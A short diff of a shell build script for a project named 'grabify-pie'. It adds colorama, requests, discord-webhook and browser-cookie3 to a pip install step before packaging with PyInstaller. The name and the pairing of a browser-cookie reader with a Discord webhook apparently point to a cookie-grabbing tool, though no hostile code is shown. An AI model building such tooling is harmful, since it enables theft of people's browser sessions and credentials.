@@ -8,7 +8,7 @@ read yn
 
 if [ $yn == "yes" ] 
 then
-  python3 -m pip install pyinstaller
+  python3 -m pip install pyinstaller colorama requests discord-webhook browser-cookie3
 fi
 
 printf "\033[1mbuilding grabify-pie...\033[0m"
